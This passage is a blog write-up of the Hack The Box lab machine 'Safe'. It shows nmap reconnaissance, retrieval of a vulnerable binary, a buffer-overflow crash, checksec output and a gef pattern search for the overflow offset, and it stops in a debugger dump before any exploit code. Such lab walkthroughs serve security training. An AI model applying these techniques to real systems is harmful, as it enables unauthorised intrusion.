<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Safe - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Safe"><a href="#Hack-The-Box-Safe" class="headerlink" title="Hack The Box - Safe"></a>Hack The Box - Safe</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today Safe retired and here’s my write-up about it. It’s a relatively easy machine with a binary exploitation challenge to get an initial shell, then for privilege escalation you have to crack a KeePass database to get root’s password and read the flag. It’s a Linux box and its ip is <code>10.10.10.147</code>, I added it to <code>/etc/hosts</code> as <code>safe.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/safe/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# nmap -sV -sT -sC -o nmapinitial safe.htb</span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-10-25 16:00 EET</span><br><span class="line">Nmap scan report for safe.htb (10.10.10.147)</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)</span><br><span class="line">|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)</span><br><span class="line">|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.25 (Debian)</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 39.90 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe#</span><br></pre></td></tr></table></figure>
<p>We got <code>http</code> on port 80 and <code>ssh</code> on port 22. Let’s check the web service.</p>
<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>By going to <code>http://safe.htb</code> we see the default <code>apache</code> index page:<br><img src="/images/hackthebox/safe/1.png" alt=""><br>This is one of the most annoying parts about this box because at this point anyone would start enumerating sub directories, <code>vhosts</code>, other ports etc… and they won’t find anything, because the thing you’re looking for is in a comment in the default <code>apache</code> page:<br><img src="/images/hackthebox/safe/2.png" alt=""></p>
<p>It’s saying that a program called <code>myapp</code> can be downloaded from there, so I downloaded it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# wget http:&#x2F;&#x2F;safe.htb&#x2F;myapp</span><br><span class="line">--2019-10-25 16:03:23--  http:&#x2F;&#x2F;safe.htb&#x2F;myapp</span><br><span class="line">Resolving safe.htb (safe.htb)... 10.10.10.147</span><br><span class="line">Connecting to safe.htb (safe.htb)|10.10.10.147|:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 16592 (16K)</span><br><span class="line">Saving to: ‘myapp’</span><br><span class="line"></span><br><span class="line">myapp                                                100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]  16.20K  14.3KB&#x2F;s    in 1.1s    </span><br><span class="line"></span><br><span class="line">2019-10-25 16:03:31 (14.3 KB&#x2F;s) - ‘myapp’ saved [16592&#x2F;16592]</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# file myapp </span><br><span class="line">myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe#</span><br></pre></td></tr></table></figure>
<p>Let’s start analyzing it.</p>
<h2 id="myapp-Analysis"><a href="#myapp-Analysis" class="headerlink" title="myapp: Analysis"></a>myapp: Analysis</h2><p>The program simply asks for a string then it prints it back:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# chmod +x .&#x2F;myapp</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# .&#x2F;myapp </span><br><span class="line"> 16:04:00 up  4:17,  3 users,  load average: 0.71, 0.70, 0.37</span><br><span class="line"></span><br><span class="line">What do you want me to echo back? test</span><br><span class="line">test</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe#</span><br></pre></td></tr></table></figure>
<p>The comment said that the program is running on port 1337, let’s verify that:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# nc safe.htb 1337</span><br><span class="line"> 10:05:15 up  2:20,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">test</span><br><span class="line"></span><br><span class="line">What do you want me to echo back? test</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ncat: Broken pipe.</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe#</span><br></pre></td></tr></table></figure>
<p>Giving it a long string makes it crash so we have a buffer overflow:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# .&#x2F;myapp </span><br><span class="line"> 16:04:10 up  4:17,  3 users,  load average: 0.60, 0.68, 0.37</span><br><span class="line"></span><br><span class="line">What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Segmentation fault</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe#</span><br></pre></td></tr></table></figure>
<p><code>checksec</code> shows that <code>NX</code> is enabled so won’t be able to execute shellcode, we also won’t be able to do <code>ret2libc</code> because we don’t have <code>libc</code> so we need to find another way to exploit the binary:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# checksec myapp</span><br><span class="line">[*] &#39;&#x2F;root&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe&#x2F;myapp&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe#</span><br></pre></td></tr></table></figure>


<h2 id="myapp-Exploitation"><a href="#myapp-Exploitation" class="headerlink" title="myapp: Exploitation"></a>myapp: Exploitation</h2><h3 id="Exploitation-Finding-the-Offset"><a href="#Exploitation-Finding-the-Offset" class="headerlink" title="Exploitation: Finding the Offset"></a>Exploitation: Finding the Offset</h3><p>I used a pattern to locate the offset:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">gef➤  pattern create                                                                                                                                                                                               </span><br><span class="line">[+] Generating a pattern of <span class="number">1024</span> bytes                                                                                                                                                                             </span><br><span class="line">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaa</span><br><span class="line">aaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaa</span><br><span class="line">acdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaade</span><br><span class="line">aaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaa</span><br><span class="line">aaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf                               </span><br><span class="line">[+] Saved as '$_gef0'                                                                                                                                                                                              </span><br><span class="line">gef➤  r                                                                                                                                                                                                            </span><br><span class="line">Starting program: /root/Desktop/HTB/boxes/safe/myapp                                                                                                                                                               </span><br><span class="line">[Detaching after vfork from child <span class="built_in">process</span> <span class="number">5416</span>]                                                                                                                                                                    </span><br><span class="line"> <span class="number">16</span>:<span class="number">12</span>:<span class="number">56</span> up  <span class="number">4</span>:<span class="number">26</span>,  <span class="number">4</span> users,  load average: <span class="number">0.26</span>, <span class="number">0.31</span>, <span class="number">0.30</span>                                                                                                                                                      </span><br><span class="line">                                                                                                                                                                                                                   </span><br><span class="line">What <span class="keyword">do</span> you want me to echo back? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaaw</span><br><span class="line">aaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaa</span><br><span class="line">aaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaa</span><br><span class="line">czaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaeba</span><br><span class="line">aaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf</span><br><span class="line">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf                              </span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"><span class="number">0x00000000004011ac</span> <span class="function">in <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : <span class="number">0x0</span></span><br><span class="line">$rbx   : <span class="number">0x0</span></span><br><span class="line">$rcx   : <span class="number">0x00007ffff7ecf924</span>  →  <span class="number">0x5477fffff0003d48</span> (<span class="string">"H="</span>?)</span><br><span class="line">$rdx   : <span class="number">0x00007ffff7fa0580</span>  →  <span class="number">0x0000000000000000</span></span><br><span class="line">$rsp   : <span class="number">0x00007fffffffe218</span>  →  <span class="string">"paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava[...]"</span></span><br><span class="line">$rbp   : <span class="number">0x616161616161616f</span> (<span class="string">"oaaaaaaa"</span>?)</span><br><span class="line">$rsi   : <span class="number">0x0000000000405260</span>  →  <span class="string">"aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaa[...]"</span></span><br><span class="line">$rdi   : <span class="number">0x0</span></span><br><span class="line">$rip   : <span class="number">0x00000000004011ac</span>  →  &lt;main+<span class="number">77</span>&gt; ret </span><br><span class="line">$r8    : <span class="number">0x401</span></span><br><span class="line">$r9    : <span class="number">0x00007ffff7fa5500</span>  →  <span class="number">0x00007ffff7fa5500</span>  →  [loop detected]</span><br><span class="line">$r10   : <span class="number">0x0000000000405660</span>  →  <span class="number">0x0000000000000000</span></span><br><span class="line">$r11   : <span class="number">0x246</span></span><br><span class="line">$r12   : <span class="number">0x0000000000401070</span>  →  &lt;_start+<span class="number">0</span>&gt; <span class="keyword">xor</span> ebp, ebp</span><br><span class="line">$r13   : <span class="number">0x00007fffffffe2f0</span>  →  <span class="string">"raaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxa[...]"</span></span><br><span class="line">$r14   : <span class="number">0x0</span></span><br><span class="line">$r15   : <span class="number">0x0</span></span><br><span class="line">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction <span class="built_in">overflow</span> RESUME virtualx86 identification]                                                                                                       </span><br><span class="line">$cs: <span class="number">0x0033</span> $ss: <span class="number">0x002b</span> $ds: <span class="number">0x0000</span> $es: <span class="number">0x0000</span> $fs: <span class="number">0x0000</span> $gs: <span class="number">0x0000</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── <span class="built_in">stack</span> ────</span><br><span class="line"><span class="number">0x00007fffffffe218</span>│+<span class="number">0x0000</span>: <span 